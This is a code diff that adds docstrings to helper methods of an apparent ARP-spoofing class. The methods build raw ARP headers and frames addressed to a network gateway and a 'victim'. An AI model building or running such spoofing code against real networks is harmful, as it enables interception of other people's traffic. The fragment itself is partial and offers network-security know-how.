@@ -131,7 +131,11 @@ class ARPSpoofer:
                 break
 
     def _make_prototcol_headers(self):
-        """Create protocol headers without MAC and IP addresses"""
+        """
+        Create protocol headers without MAC and IP addresses
+
+        :return: a byte-string that represent protocol headers
+        """
         htype = b"\x00\x01"  # Hardware Type
         ptype = b"\x08\x00"  # Protocol Type
         hlen = b"\x06"  # Hardware Length
@@ -141,13 +145,22 @@ class ARPSpoofer:
         return protocol
 
     def _make_packet_for_gateway(self):
-        """Create a packet sample that will be send to the gateway"""
+        """
+        Create a packet sample that will be send to the gateway
+
+        :return: a byte-string that contains ARP code and gw's and your MACs
+        """
         arp_code = b"\x08\x06"  # Protocol code
         gateway_packet = self.gateway_mac + self.mac + arp_code
         return gateway_packet
 
     def _make_packet_for_victim(self):
-        """Create a packet sample that will be send to the victim"""
+        """
+        Create a packet sample that will be send to the victim
+
+        :return: a byte-string that contains ARP code and victim's and
+                 your MACs
+        """
         arp_code = b"\x08\x06"  # Protocol code
         victim_packet = self.victim_mac + self.mac + arp_code
         return victim_packet
